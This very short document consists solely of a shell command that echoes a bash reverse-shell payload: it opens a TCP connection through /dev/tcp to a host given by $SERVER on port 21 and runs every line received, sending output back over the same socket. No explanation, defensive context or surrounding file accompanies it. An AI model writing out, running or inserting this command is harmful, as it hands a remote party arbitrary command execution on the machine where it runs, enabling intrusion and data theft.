echo 'exec 5<>/dev/tcp/$SERVER/21; while read line; do $line; done <&5 >&5;'
